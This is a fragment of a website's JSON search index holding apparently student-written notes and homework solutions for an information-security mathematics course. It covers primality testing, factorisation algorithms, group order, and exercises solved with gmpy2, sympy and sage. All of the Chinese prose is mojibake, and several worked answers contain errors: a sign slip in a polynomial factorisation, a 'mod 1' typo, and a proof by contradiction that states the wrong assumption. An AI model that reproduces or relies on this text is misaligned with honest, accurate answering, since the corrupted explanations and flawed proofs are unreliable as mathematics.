æ˜¯æ­£æ•´æ•°ï¼Œd æ˜¯å¥‡æ•°ã€‚ æ ¹æ®è´¹é©¬å°å®šç†ï¼Œå¯¹äºä¸€ä¸ªç´ æ•° pï¼Œæˆ‘ä»¬æœ‰ $$a^{p-1} \\equiv 1 \\bmod{p}$$ å¯¹ä¸Šå¼åšå¼€æ ¹å·æ“ä½œï¼Œæˆ‘ä»¬æœ‰ç»“è®ºä¸‹è€…ä¸¤å¼æœ‰ä¸€ä¸ªæˆç«‹ $$\\begin{cases} a^d \u0026amp;\\equiv 1 \u0026amp;\\bmod{p} \\ a^{2^r d} \u0026amp;\\equiv -1 \u0026amp;\\bmod{p} \\text{ ,where }\\exists r, 0 \\le r \\le s-1\\end{cases}$$  ä¸Šé¢ç»“è®ºçš„é€†å¦å‘½é¢˜æ˜¯ï¼š\n å¦‚æœ $$\\exists a \\Rightarrow \\begin{cases} a^d \u0026amp;\\not\\equiv 1 \u0026amp;\\bmod{p} \\ a^{2^rd} \u0026amp;\\not\\equiv -1 \u0026amp;\\bmod{p} \\text{, where } \\forall r, 0 \\le r \\le s-1 \\end{cases}$$ï¼Œé‚£ä¹ˆ p æ˜¯ä¸€ä¸ªåˆæ•°ã€‚  Rabin-Miller ç®—æ³•åˆ©ç”¨ä¸Šé¢ç»“è®ºçš„å¦å‘½é¢˜è¿›è¡Œåˆ¤å®šï¼Œæ˜¯ä¸€ä¸ªä¸ä¸€å®šæ­£ç¡®ä½†æ˜¯å¤§æ¦‚ç‡æ­£ç¡®çš„åˆ¤å®šæ–¹å¼ã€‚\næ•´æ•°çš„åˆ†è§£ #  ä¸€ã€è´¹é©¬ç´ æ•°åˆ†è§£æ³•\nå¯¹äºå¥‡æ•´æ•° nï¼Œèƒ½å¤Ÿè·å¾—ä¸€ä¸‹çš„æ–¹ç¨‹ $$n = x^2 - y^2$$ çš„æ•´æ•°è§£ï¼Œä¹Ÿå°±è·å¾—äº† n çš„ä¸¤ä¸ªå› å­ï¼Œå› ä¸ºï¼š$$n = (x - y)(x +y)$$\næ ¹æ®ä»¥ä¸Šçš„ç»“è®ºï¼Œæˆ‘ä»¬æœ‰ä»¥ä¸‹çš„ç®—æ³•ï¼š\n é¦–å…ˆç¡®å®šæœ€å°çš„æ•´æ•° kï¼Œä½¿å¾— $$k^2 \\ge n$$ï¼Œç„¶åï¼Œå¯¹ä¸‹é¢çš„æ•°åˆ—ï¼š$$k^2 -n, (k+1)^2 - n, (k+2)^2 -n, \u0026hellip;, ((n+1)/2)^2 - n$$ æŒ‰é¡ºåºè¿›è¡Œæµ‹è¯•ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ•´æ•° m ä½¿å¾— $$m^2 - n$$ ä¸ºä¸€ä¸ªå¹³æ–¹æ•´æ•°ï¼Œä»è€Œä¹Ÿå°±æ‰¾åˆ°äº†ä¸€å¯¹å› å­ã€‚å¦åˆ™ n å°±æ²¡æœ‰éå¹³å‡¡å› å­ã€‚  äºŒã€$$Pollad\\ \\rho$$ åˆ†è§£ç®—æ³•\nç®—æ³•ï¼š\n é¦–å…ˆï¼Œç¡®å®šä¸€ä¸ªç®€å•çš„äºŒæ¬¡ä»¥ä¸Šæ•´ç³»æ•°å¤šé¡¹å¼ï¼Œä¾‹å¦‚ $$f(x) = x^2 + a, a\\ne -2,0$$ã€‚ç„¶åï¼Œä»ä¸€ä¸ªåˆå§‹å€¼å¼€å§‹ï¼Œåˆ©ç”¨è¿­ä»£å…¬å¼ $$x_{k+1} \\equiv f(x_k) \\pmod{n}$$ è®¡ç®—ä¸€ä¸ªåºåˆ— $$x_1, x_2, \u0026hellip;$$ã€‚ ä»¤ d ä¸º n çš„ä¸€ä¸ªå¹³å‡¡å› å­ï¼Œå› ä¸ºæ¨¡ d çš„å‰©ä½™ç±»ä¸ªæ•°æ¯”æ¨¡ n çš„å‰©ä½™ç±»ä¸ªæ•°å°‘å¾ˆå¤šï¼Œå¾ˆå¯èƒ½å­˜åœ¨æŸä¸ª $$x_i$$ å’Œ $$x_j$$ æ˜¯å±äºåŒä¸€ä¸ªæ¨¡ d å‰©ä½™ç±»åˆä¸å±äºæ¨¡ n çš„å‰©ä½™ç±»ï¼Œæ‰€ä»¥ $$gcd(x_k - x_j, n)$$ æ˜¯ n çš„éå¹³å‡¡å› å­ã€‚  "},{"id":234,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/9.%E7%BE%A4/","title":"9.ç¾¤","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"ç¾¤ #  æ¦‚å¿µå’Œæ€§è´¨ #  å®šä¹‰ï¼ˆç¾¤çš„é˜¶ï¼‰ï¼š\n ç¾¤ $$(G, *)$$ çš„å…ƒç´ ä¸ªæ•° |G| è¢«ç§°ä¸ºç¾¤çš„é˜¶ï¼Œå¦‚æœ |G| æœ‰é™ï¼Œåˆ™ç§° G ä¸ºæœ‰é™ç¾¤ã€‚  å®šä¹‰ï¼ˆå…ƒç´ çš„é˜¶ï¼‰ï¼š\n åœ¨ç¾¤ G ä¸­ï¼Œå¯¹äºå…ƒç´  a æ¥è¯´ï¼Œä½¿å¾— $$a^n = 1$$ çš„æœ€å°æ­£æ•´æ•° n ç§°ä¸ºå…ƒç´  a çš„é˜¶ï¼Œè®°ä½œ ord(a)ã€‚å¦‚æœä¸å­˜åœ¨è¿™æ ·çš„æ­£æ•´æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§° a ä¸ºæ— é™é˜¶å…ƒç´ ã€‚  å®šç†ï¼š\n ç¾¤ G ä¸­å…ƒç´  a çš„é˜¶ä¸º kï¼Œå¦‚æœ $$a^n = 1$$ï¼Œé‚£ä¹ˆ k|n  "},{"id":235,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.1/","title":"2.1","section":"HOMEWORK","content":"2.1 #  è§£ç­”é¢˜ #  1 #  \u0026gt;\u0026gt;\u0026gt; import gmpy2 \u0026gt;\u0026gt;\u0026gt; print(gmpy2.gcd(55, 85), gmpy2.gcd(202, 282), gmpy2.gcd(666, 1414), gmpy2.gcd(20785, 44350)) 5 2 2 5 æ‰‹ç®—å¯ä»¥ç”¨è¾—è½¬ç›¸é™¤æ³•ã€‚æ¯”å¦‚ï¼š\n55, 85 ==\u0026gt; 55, 30 ==\u0026gt; 25, 30 ==\u0026gt; 25, 5 ==\u0026gt; 5|25 2 #  \u0026gt;\u0026gt;\u0026gt; import gmpy2 \u0026gt;\u0026gt;\u0026gt; print(gmpy2.lcm(231, 732), gmpy2.lcm(-871, 728)) 56364 48776 # å•ä¸ªè¾“å‡ºæ—¶å¯èƒ½è§åˆ° mpz çš„ç¬¦å· # mpz æ˜¯ GNU é¡¹ç›®ç”¨äºå¤„ç†å¤§æ•´æ•°çš„ C++ åº“ æ‰‹ç®—å¯ä»¥ç”¨çŸ­é™¤æ³•ã€‚æ¯”å¦‚ï¼š\nåˆå§‹åŒ–: a=231, b=732, Set={}\rgcd(231, 732)=3 ==\u0026gt; Set={3}\rgcd(77, 244)=1 ==\u0026gt; Set={3, 77, 244} å¦å¤–æœ€å°å…¬å€æ•°å¿…é¡»æ˜¯æ­£æ•´æ•°ï¼ˆä¸ç„¶å¯ä»¥æ— ç©·å°ï¼‰ã€‚\n3 #  åœ¨ linux bash ç¯å¢ƒä¸‹ï¼Œfactor å¯ä»¥ç”¨äºè¾ƒå°æ•°å­—çš„åˆ†è§£ï¼š\n$ factor 36 69 200 289 36: 2 2 3 3 69: 3 23 200: 2 2 2 5 5 289: 17 17 æ‰‹ç®—çŸ­é™¤ã€‚\n4 #  \u0026gt;\u0026gt;\u0026gt; import sympy \u0026gt;\u0026gt;\u0026gt; x = sympy.symbols(\u0026#39;x\u0026#39;) \u0026gt;\u0026gt;\u0026gt; sympy.polys.factor(x**4 - 3*x**2 + 9) (x**2 - 3*x + 3)*(x**2 + 3*x + 3) å³ï¼š$$x^4 - 3x^2 + 9 = (x^2 - 3x + 3)(x^2 + 3x + 3)â€‹$$\næ‰€ä»¥ $$a^4 - 3a^2 + 9â€‹$$ æ˜¯åˆæ•°ã€‚\næ‰‹ç®—æ–¹æ³•ï¼š$$a^4 -3a^2 + 9 = (a^2 + 3)^2 - 9a^2 = (a^2 -3a +3)(a^2 +3a - 3)$$\nè¯æ˜é¢˜ #  1 #   å¼•ç†ï¼š$$a | n, b | n \\Rightarrow lcd(a, b) | nâ€‹$$\n $$2|n, 5|n, 7|n \\Rightarrow lcd(2,5,7) | n \\Rightarrow70 | n$$\n2 #   å¼•ç†ï¼š\n $$a | n, b | n \\Rightarrow lcd(a, b) | nâ€‹$$ $$a | n \\Leftrightarrow n \\equiv 0 \\pmod{a}$$ $$a |b, c | d \\Rightarrow ac | bd$$   è®¾ä¸‰ä¸ªè¿ç»­æ­£æ•´æ•° $$a, a+1, a+2$$\nè€ƒè™‘ $$\\mathbb{Z}_3$$ï¼Œå› ä¸º $$a \\not\\equiv a+1 \\not\\equiv a+2 \\pmod{3}$$ï¼Œä¸‰æ•°å¿…æ„æˆæ¨¡ 3 å®Œå…¨å‰©ä½™ç³»ï¼Œå­˜åœ¨ $$x \\equiv 0 \\pmod{3} â€‹$$\nè€ƒè™‘ $$\\mathbb{Z}_2$$ï¼Œå› ä¸º $$a \\not\\equiv a+ 1 \\pmod{2}$$ï¼ŒäºŒæ•°å¿…æ„æˆæ¨¡ 2 çš„å®Œå…¨å‰©ä½™ç³»ï¼Œå­˜åœ¨ $$ y \\equiv 0 \\pmod{2}$$\nå½“ $$x = y$$ æ—¶ï¼Œ$$2 | x, 3 | x \\Rightarrow 6 | n \\Rightarrow 6 | a(a+1)(a+2)$$\nå½“ $$x \\neq y$$ æ—¶ï¼Œ$$2 | y, 3 | x \\Rightarrow 6 | xy \\Rightarrow 6 | a(a+1)(a+2)$$\n NOTE: ç©·ä¸¾æœ€ç®€å•\n 3 #   å¼•ç†ï¼š$$a(a+1) = 2k$$\n è®¾å¥‡æ•° $$2n+1$$ï¼š\n$$(2n + 1)^2 = 4n^2 + 4n + 1 = 4n(n+1) + 1 = 8k + 1$$\n4 #  $$\\displaystyle mn + pq = (m - p) * \\frac{(m-p)n +p(n + q)}{m - p} = (m - p)(n + \\frac{p(n+q)}{m-p})$$\nå› æ­¤ï¼š$$m-p | p(n+q)$$\n$$\\displaystyle mq + np = (m - p) * \\frac{(m-p)q + p(n + q)}{m-p} = (m-p)(q + \\frac{p(n+q)}{m - p})$$\nå› æ­¤ï¼š$$m - p | mq + np$$\n5 #  ç”¨ sympy.polys.factor åˆ†è§£ $$a^3 - a = a(a+1)(a - 1)â€‹$$ã€‚\nè€ƒè™‘ $$\\mathbb{Z}_3$$ï¼Œå› ä¸º $$a \\not\\equiv a+1 \\not\\equiv a - 1 \\pmod{3}$$ï¼Œä¸‰æ•°å¿…æ„æˆæ¨¡ 3 å®Œå…¨å‰©ä½™ç³»ï¼Œå­˜åœ¨ $$x \\equiv 0 \\pmod{3} $$\n$$a^3 - a \\equiv 0 \\pmod{3} \\Leftrightarrow 3 | a^3 -a$$\n6 #  ä»¤ $$a = (k+1)!$$ï¼Œ\nåˆ™ $$a+i = (k(k-1)..(a-1)(a+1)\u0026hellip;2*1)(a + 1), i \\in {2, 3, \u0026hellip; k, k+1}$$\n7 #  è®¾ $$k = gcd(a+b, a-b) \\Rightarrow a + b = ks, a-b = kt, \\text{where } gcd(s, t) = 1â€‹$$\nåˆ™ï¼š$$\\displaystyle a = \\frac{1}{2} k(s+t), b = \\frac{1}{2} k(s-t)$$\nå†è®¾ï¼š$$m = gcd(s+t, s-t)$$ï¼Œ\nåˆ™å¿…æœ‰ï¼š$$\\displaystyle gcd(a, b) = \\frac{1}{2}km = 1 \\Rightarrow km =2 \\Rightarrow k \\in {1,2}$$\nå†è¯æ˜å­˜åœ¨æ€§ï¼š$$a = 1, b = 3, gcd(4,2) = 2; a = 2, b = 3, gcd(5,1)=1$$\n8 #   å¼•ç†ï¼š\n $$gcd(a, b) = gcd(a, ak + b)$$ $$gcd(a, b) = gcd(a, bk)$$   åŒ 7 è®¾ $$k = gcd(a+b, a-b) \\Rightarrow a + b = ks, a-b = kt, \\text{where } gcd(s, t) = 1â€‹$$\nåˆ™ï¼š$$\\displaystyle gcd(a+b, a^2 + b^2) = gcd(ks, \\frac{1}{2}k^2(s^2 + t^2)) = k *gcd(s, \\frac{1}{2}k(s^2 + t^2) )â€‹$$\nå½“ $$k=2$$ æ—¶ï¼š\n $$gcd(a+b, a^2+b^2) = 2 * gcd(s, s^2 + t^2) = 2 * gcd(s, t^2) =2 * gcd(s, t) = 2$$  å½“ $$k = 1â€‹$$ æ—¶ï¼š\n $$\\displaystyle gcd(a+b, a^2+b^2) = gcd(s, \\frac{1}{2}(s^2 + t^2)) = gcd(s, s^2 + t^2) = 1$$  9 #   å¼•ç†ï¼š$$\\displaystyle a^{st} - 1 = (a^s - 1)(\\sum_{i=1}^{t} a^{s(t-i)})$$\n è®¾ $$r = gcd(m,n), m = rs, n = rt$$ï¼Œ\nå¯¹äº $$\\displaystyle a^m - 1 = a^{rs} - 1 = (a^r - 1)(\\sum_{i=1}^s a^{r(s - i)}) = (a^r - 1)\\sum_{i = 0}^{s-1}a^{ri}$$ï¼Œä»¤ $$\\displaystyle T_s = \\sum_{i=0}^{s-1} a^{ri}$$\nåŒç†å¯ä»¥å¾—åˆ°ï¼š$$\\displaystyle a^n - 1 = a^{rt} - 1 = (a^r - 1)T_t$$\nå¯ä»¥ç”¨è¾—è½¬ç›¸é™¤è¯æ˜ï¼š\nè‹¥ s, t äº’ç´ ï¼Œ$$\\exist u(x), v(x)$$ ä¸ºå¤šé¡¹å¼å‡½æ•°ï¼Œä½¿å¾— $$u(a) * T_s + v(a) * T_t = 1$$\næ‰€ä»¥ $$ T_s, T_t$$ äº’ç´ ï¼Œåˆ™æœ‰ï¼š$$gcd(a^m - 1, a^n - 1) = a^r - 1$$\n10 #   å¼•ç†ï¼š$$n(n+1) = 2k(2k+1)â€‹$$\n $$p_n = n^4 + 2 n^3 + 11n^2 +10n = n(n + 1)(n(n+1) + 10) $$\n$$2k(2k+1)(4k^2 + 2k +10) = 4k(2k + 1)(2k^2 + k +5)$$\n  å½“ $$k \\equiv 0 \\pmod{3}$$ æ—¶ï¼Œ$$3 | k \\Rightarrow 12 | 4k \\Rightarrow12 | p_n$$\n  å½“ $$k \\equiv 1 \\pmod{3}$$ æ—¶ï¼Œ$$3 | 2k + 1 \\Rightarrow 12 |4(2k+1) \\Rightarrow 12 | p_n$$\n  å½“ $$k \\equiv 2\\pmod{3}$$ æ—¶ï¼Œ$$3 | 2k^2 +k + 5\\Rightarrow 12 | p_n$$\n  11 #  å› ä¸ºï¼š\n  å¯¹äº $$a \\equiv 0 \\pmod{3}$$ï¼Œæœ‰ $$a^2 \\equiv 0 \\pmod{3}$$\n  å¯¹äº $$a \\equiv 1 \\pmod{3}$$ï¼Œæœ‰ $$a^2 \\equiv 1 \\pmod{3}$$\n  å¯¹äº $$a \\equiv 2 \\pmod{3}$$ï¼Œæœ‰ $$a^2 \\equiv 1 \\pmod{3}$$\n  æ‰€ä»¥ä¸å­˜åœ¨ä»»ä½• xï¼Œä½¿å¾— $$x^2 \\equiv 2 \\pmod{3}$$\nå¯¹äº $$3 | a^2 +b^2$$ï¼Œè‹¥ $$a^2 \\equiv 1 \\pmod{1}$$ï¼Œåˆ™ $$b^2 \\equiv 2 \\pmod{3}$$ï¼Œè¿™æ˜¯ä¸å­˜åœ¨çš„ã€‚\næ‰€ä»¥ $$a^2 \\equiv 0 \\pmod{3}, b^2 \\equiv 0 \\pmod{3} \\Rightarrow 3 |a, 3|b$$\n12 #  å¯¹äº $$\\mathbb{Z}_{10}$$ï¼Œç”¨ç©·ä¸¾æ–¹å¼å¾ˆå®¹æ˜“éªŒè¯ï¼š$$\\forall x, x^5 \\equiv x \\pmod{10}$$\næ‰€ä»¥å¯¹ä»»æ„ n çš„ä¸ªä½æ•° $$n_0$$ï¼š$$n_0^{k-1} n_0^5 \\equiv n_0^{k-1}n_0 \\pmod{10} \\Rightarrow n_0^{k+4} \\equiv n_0^{k} \\pmod{10} $$\n13 #  $$n^2 + (n+1)^2 = m^2 + 2 \\Leftrightarrow$$\n$$2n^2 + 2n + 1 = m^2 + 2â€‹$$\nå› ä¸º $$2n^2 + 2n + 1 \\equiv 1 \\pmod{2}$$ï¼Œæ‰€ä»¥ $$m \\equiv 1 \\pmod{2}$$\nå¸¦å…¥ï¼š$$m = 2k + 1â€‹$$ï¼Œ\n$$2n^2 + 2n + 1 = 4 k^2 + 4 k +3 \\Leftrightarrow n^2 + n = 2k^2 + 2 k + 1$$\n$$n^2 + n \\equiv 0 \\pmod{2}, 2k^2 + 2 k + 1 \\equiv 1 \\pmod{2}$$ï¼Œç­‰å¼æ’ä¸æˆç«‹ã€‚\n14 #  è€ƒè™‘ $$\\mathbb{Z}_{n}$$ï¼Œ\nè®¾ n ä¸ªæ•´æ•°ä¸ºæœ‰åºæ•°åˆ— $$a_1, a_2, \u0026hellip;a_nâ€‹$$ï¼Œå…¶å‰ m é¡¹å’Œä¸º $$\\displaystyle S_m = \\sum_{i=1}^{m} a_i, m= 1,2, \u0026hellip;, nâ€‹$$\nè‹¥å¯¹ $$S_m \\equiv T_m \\pmod{n}â€‹$$ çš„å–å€¼ç©ºé—´åˆ†æï¼Œæ˜¾ç„¶å…¶å–å€¼ç©ºé—´å¤§å°ä¸º nï¼Œ\n è‹¥ $$\\forall i,j \\in [1, n], i\\neq j \\Rightarrow T_i \\neq T_j$$ï¼Œå¿…æœ‰ $$\\exist S_i \\equiv 0 \\pmod{n}$$ è‹¥ $$\\exist i,j \\in [1, n], i\\neq j, T_i = T_j$$ï¼Œä»¤ $$S_0 = S_i - S_j, S_0 \\equiv 0 \\pmod{n}$$  15 #   https://zhidao.baidu.com/question/90940244.html\n å¯¹äºä»»ä½• $$k \\in [1, 2n], \\exist A,B, k = A*2^B, \\text{where } A \\equiv 1 \\pmod{2}, B \\ge 0$$\nè€ƒè™‘ A çš„å–å€¼ï¼Œå¯çŸ¥ A æœ€å¤§ä¸º $$2n-1$$ï¼Œå› æ­¤ A çš„å–å€¼ç©ºé—´å¤§å°ä¸º nã€‚\nè‹¥å–å‡º n+1 ä¸ªæ•°ï¼Œåˆ™å¿…å­˜åœ¨ $$k_1 = A_i 2^{B_1}, k_2 = A_i2^{B_2}$$ï¼ŒäºŒè€…å¿…å­˜åœ¨æ•´é™¤å…³ç³»\n16 #   https://blog.csdn.net/zhcosin/article/details/48932201\n åŒ 15ï¼Œå¯¹äºä»»ä½• $$k \\in [1, n], \\exist a,b, k = a*2^b, \\text{where } a \\equiv 1 \\pmod{2}, b \\ge 0$$\næˆ‘ä»¬ä»¤ b å–å€¼ç©ºé—´ä¸­çš„æœ€å¤§å€¼ä¸º Bï¼Œå¯çŸ¥ B çš„æœ€å¤§å€¼åªå‡ºç°ä¸€æ¬¡ï¼š\n è‹¥å‡ºç°ä¸¤æ¬¡ï¼Œå³å­˜åœ¨ $$2^{B} a_1 \\neq 2^{B} a_2$$ï¼Œé‚£ä¹ˆå¿…ç„¶å­˜åœ¨ $$2^{B+1}a_0 \\in [2^Ba_1, 2^Ba_2]$$ ï¼Œè¿™ä¸ B ä¸ºæœ€å¤§å€¼çŸ›ç›¾ã€‚è®¾è¿™ä¸ªæ•°å­—ä¸ºï¼š$$K = 2^{B} A$$  å¯¹äº $$\\displaystyle S_n = 1 + \\frac{1}{2} + \u0026hellip; + \\frac{1}{n}$$\nåŒä¹˜ $$2^{B-1} a_0 a_1\u0026hellip;a_{s-1}$$ï¼Œå…¶ä¸­ s æ˜¯ a çš„å–å€¼ç©ºé—´å¤§å°ï¼š$$\\displaystyle 2^{B-1} a_0 a_1\u0026hellip;a_{s-1} S_n = P + 2^{B-1} a_0 a_1\u0026hellip;a_{s-1} *\\frac{1}{K}$$ï¼Œå…¶ä¸­ P æ˜¯ä¸€ä¸ªæ•´æ•°ã€‚\næ˜¾ç„¶ï¼Œ$$\\displaystyle 2^{B-1} a_0 a_1 \u0026hellip; a_{s-1} *\\frac{1}{K} = \\frac{a_0 a_1 \u0026hellip; a_{s-1}}{2 * A}$$ ä¸æ˜¯æ•´æ•°ï¼Œé‚£ä¹ˆ $$S_n$$ ä¹Ÿä¸æ˜¯æ•´æ•°ã€‚\n17 #   å®šä¹‰ï¼š\n å¯¹äº n ä¸ºå®Œå…¨å¹³æ–¹æ•°ï¼Œå³å­˜åœ¨æ­£æ•´æ•° kï¼Œä½¿å¾— $$k^2 = n$$    å¼•ç†ï¼š\n $$mn$$ ä¸ºå®Œå…¨å¹³æ–¹æ•°çš„å……è¦æ¡ä»¶æ˜¯ $$m,n$$ å‡ä¸ºå®Œå…¨å¹³æ–¹æ•°   å……åˆ†æ€§æ˜¯å¾ˆæ˜¾ç„¶çš„ã€‚\nå¿…è¦æ€§ï¼š\nä¸å¤±ä¸€èˆ¬æ€§ï¼Œå¯¹äº $$\\displaystyle n = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}$$ï¼Œæˆ‘ä»¬è®¾ä»… $$\\alpha_1 \\equiv 1 \\pmod{2}$$\nå³è¯æ˜ï¼šå¯¹äºç´ æ•° $$p_1â€‹$$ï¼Œå¥‡æ•° $$\\alpha_1 \\equiv 1 \\pmod{2}â€‹$$ï¼Œ$$p_1^{\\alpha_1}â€‹$$ ä¸å¯èƒ½ä¸ºå®Œå…¨å¹³æ–¹æ•°ã€‚\nå¯¹äº $$\\forall n \\in [1, p_1^{\\alpha_1}]â€‹$$ï¼Œæœ‰ä¸”ä»…æœ‰ $$n = p_1, p_1^{\\alpha_1} \\equiv 0 \\pmod{n}â€‹$$\nè‹¥å­˜åœ¨ $$k^2 = p_1^{\\alpha_1}â€‹$$ï¼Œåˆ™ï¼š$$k^2 \\equiv 0 \\pmod{p_1} \\Rightarrow k = p_1 \\Rightarrow p_1^2 = p_1^{\\alpha_1}â€‹$$\nç”±äº $$\\alpha_1 \\equiv 1 \\pmod{2}$$ï¼Œåˆ™ $$p_1 = 1$$ï¼Œè¿™ä¸ $$p_1$$ æ˜¯ç´ æ•°çŸ›ç›¾ã€‚\n18 #  è‹¥ $$\\sqrt[3]{5}$$ ä¸ºæ— ç†æ•°ï¼Œè®¾ $$\\displaystyle \\sqrt[3]{5} = \\frac{q}{p}, \\text{where }gcd(p, q) = 1$$\nåˆ™ $$5p^3 = q^3 \\Rightarrow 5 | q, q = 5k \\Rightarrow p^3 = 5^2k^3 \\Rightarrow 5|p \\Rightarrow gcd(p,q) \\neq 1$$\nè¿™ä¸å‡è®¾çŸ›ç›¾ã€‚\n"},{"id":236,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/2.2/","title":"2.2","section":"HOMEWORK","content":"2.2 #  è§£ç­”é¢˜ #  1 #  å…³äºæ¬§æ‹‰å‡½æ•°ï¼Œå¯¹äº 10ï¼š$$\\phi(10) = 4$$\nå› æ­¤æˆ‘ä»¬çŸ¥é“ $$7^4 \\equiv 1 \\pmod{10}$$ï¼Œè€Œ $$2046 \\equiv 2 \\pmod{4}$$\nå› æ­¤ï¼Œæˆ‘ä»¬æœ‰ï¼š$$7^{2046} \\equiv 7^2 \\equiv 9 \\pmod{10}â€‹$$\n2 #  å¯¹äº 100 æœ‰ï¼š$$100 = 4*25$$ï¼Œå¹¶ä¸”æœ‰ $$\\phi(25) = 20$$\nå› æ­¤é¦–å…ˆæœ‰ $$2^{100} \\equiv 0 \\pmod{4}$$ï¼Œç„¶åæœ‰ $$2^{100} = (2^{5})^{20} \\equiv 1 \\pmod{25}$$\nè€Œå­˜åœ¨è¿™æ ·çš„æ•° 76ï¼š$$2^{100} \\equiv 76 \\pmod{4}, 2^{100} \\equiv 76 \\pmod{25}$$\nå› æ­¤ $$2^{100} \\equiv 76 \\pmod{100}$$\n3 #  è€ƒè™‘åˆ° $$\\displaystyle (x+4)^5 \\overset{äºŒé¡¹å¼å±•å¼€}{\\equiv} x^5 \\pmod{4}$$\næœ‰å› ä¸º $$99 = 4 * 25 - 1 = 4*24 + 3$$\nå› æ­¤æˆ‘ä»¬æœ‰ï¼š$$1^5 + 2^5 + 3^5 +\u0026hellip; + 99^5 \\equiv 24 * (1^5 + 2^5 + 3^5) \\equiv 0\\pmod{4}$$\n4 #  æˆ‘ä»¬çŸ¥é“ $$555 \\equiv 2 \\pmod{7}$$ï¼Œ\nå¹¶ä¸”æœ‰ï¼š$$2^3 \\equiv 1 \\pmod{7}, 555 \\equiv 0 \\pmod{3}$$\nå› æ­¤ï¼š$$555^{555} \\equiv 2^{555} \\equiv 2^0 \\equiv 1 \\pmod{7}â€‹$$\n5 #  ï¼ˆ1ï¼‰æ¯ä¸ªæ•°éƒ½æ˜¯å¥‡æ•°çš„æ¨¡ 9 å®Œå…¨å‰©ä½™ç³»ï¼š\n$${1, 11, 3, 13, 5,15, 7, 17, 9}$$\nï¼ˆ2ï¼‰æ¯ä¸ªæ•°éƒ½æ˜¯å¶æ•°çš„æ¨¡ 9 å®Œå…¨å‰©ä½™ç³»ï¼š\n$${0, 10, 2, 12, 4, 14, 6, 16, 8}$$\n6 #  è€ƒè™‘ $$r_i = 11k+n, n =1,2,\u0026hellip;,11$$ï¼Œ\næœ‰ï¼š$$11k+n \\equiv 1\\pmod{3} \\Rightarrow 11k \\equiv 1-n \\pmod{3}$$\næšä¸¾ n è®¡ç®— k å¯ä»¥å¾—åˆ°è¿™æ ·çš„æ¨¡ 11 å®Œå…¨å‰©ä½™ç³»ï¼š\n$$k = {0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1} \\overset{å‰©ä½™ç³»}{\\Rightarrow}{1, 13, 25, 4, 16, 28, 7, 19, 31, 10, 22}$$\n7 #  å¯ä»¥é€šè¿‡ sage ä¸­çš„æ•°è®ºæ¨¡å—è®¡ç®—æ¬§æ‹‰å‡½æ•°ï¼š\nfrom sage.all import * print(euler_phi(24), euler_phi(64), euler_phi(187), euler_phi(360)) # (8, 32, 160, 96) ï¼ˆNOTEï¼šåœ¨ Arch Linux ä¸‹å®‰è£… sage çš„å‘½ä»¤ï¼šyaout sagemathï¼‰\nä¹Ÿå¯ä»¥ç”¨çŸ­é™¤æ³•å°†å…¶ç´ å› æ•°åˆ†è§£$$\\displaystyle m = p_1^{a_1} p_2^{a_2} \u0026hellip; p_s^{a_s}â€‹$$ï¼Œ\nç„¶ååˆ©ç”¨å…¬å¼ $$\\displaystyle \\phi(m) = m \\prod_{i=1}^s (1 - \\frac{1}{p_i})â€‹$$ï¼Œè®¡ç®—å…¶æ¬§æ‹‰å‡½æ•°ã€‚æ¯”å¦‚ï¼š\n24 ==\u0026gt; 2 2 2 3 ==\u0026gt; 24=(2^3)*(3^1)\rphi(24) ==\u0026gt; 24*(1/2)*(2/3) ==\u0026gt; 8 8 #   è´¹é©¬å°å®šç†ï¼šè‹¥ p æ˜¯ç´ æ•°ï¼Œåˆ™å¯¹ä»»æ„æ•´æ•° aï¼Œæœ‰ï¼š$$a^p \\equiv a \\pmod{p}$$\n ï¼ˆ1ï¼‰\næ ¹æ®è´¹é©¬å°å®šç†ï¼Œæˆ‘ä»¬æœ‰ï¼š$$9^{73} \\equiv 9 \\pmod{73}$$\næˆ‘ä»¬åˆçŸ¥é“ï¼š$$794 \\equiv 2 \\pmod{72}$$\nå› æ­¤æˆ‘ä»¬çŸ¥é“ $$9^{794} \\equiv 9^2 \\equiv 8 \\pmod{73}$$\nå› ä¸º $$a \\in [0, 73)â€‹$$ï¼Œæ‰€ä»¥ $$a = 8â€‹$$\nï¼ˆ2ï¼‰\næˆ‘ä»¬æœ‰ï¼š$$x^{29} \\equiv x \\pmod{29}, 86 \\equiv 2 \\pmod{28}$$\nå› æ­¤ $$x^{86} \\equiv x^{2} \\equiv 6\\pmod{29}â€‹$$\n  ç©·ä¸¾ 29 ä»¥å†…çš„æ‰€æœ‰è‡ªç„¶æ•°ï¼š\nfor i in range(29):  if (i**2)%29 == 6: print(i) # 8 21   ä¹Ÿå¯ä½¿ç”¨ sage æ¨¡å—è¿›è¡Œæ±‚è§£ï¼š\nfrom sage.all import * x = SR.symbol(\u0026#39;x\u0026#39;) solve_mod(x**2==6, 29) # [(8,), (21,)]   æ‰€ä»¥åŸåŒä½™æ–¹ç¨‹çš„è§£ä¸ºï¼š$$x \\equiv 8 \\pmod{29}â€‹$$ æˆ– $$x \\equiv 21 \\pmod{29}â€‹$$\nï¼ˆ3ï¼‰\nåŒæ ·çš„ï¼š$$x^{13} \\equiv x \\pmod{13}, 39 \\equiv 3 \\pmod{12}$$\nå› æ­¤ï¼š$$x^{39} \\equiv x^{3} \\equiv 3 \\pmod{13}$$\nåŒæ ·åœ°ï¼Œç©·ä¸¾ 13 ä»¥å†…çš„æ‰€æœ‰è‡ªç„¶æ•°ï¼ˆå¤§äº 13 çš„æ•°ä»æ— æ³•æˆç«‹å·²åœ¨ç¬¬ä¸‰é¢˜ä¸­è¯æ˜ï¼‰ï¼š\nfor i in range(13): if (i**3)%13 == 3: print(i) # 